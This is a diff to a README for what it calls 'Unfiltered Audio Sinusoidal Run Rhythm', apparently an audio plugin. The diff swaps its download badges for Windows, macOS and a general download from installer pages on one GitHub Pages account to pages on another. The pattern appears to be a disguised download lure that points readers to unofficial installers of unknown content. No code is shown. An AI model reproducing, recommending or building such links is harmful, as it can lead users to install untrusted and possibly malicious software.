@@ -28,7 +28,7 @@ Whether you're a newcomer just getting started or a seasoned pro looking for adv
 
 <div align="center">
 
-[![Download Unfiltered Audio Sinusoidal Run Rhythm](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_UNFILTERED_AUDIO_SINUSOIDAL_RUN_RHYTHM-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download Unfiltered Audio Sinusoidal Run Rhythm](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_UNFILTERED_AUDIO_SINUSOIDAL_RUN_RHYTHM-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -62,8 +62,8 @@ Getting started with **Unfiltered Audio Sinusoidal Run Rhythm** is quick and str
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-C2410C?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
-[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-C2410C?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-C2410C?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-C2410C?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 </div>
 
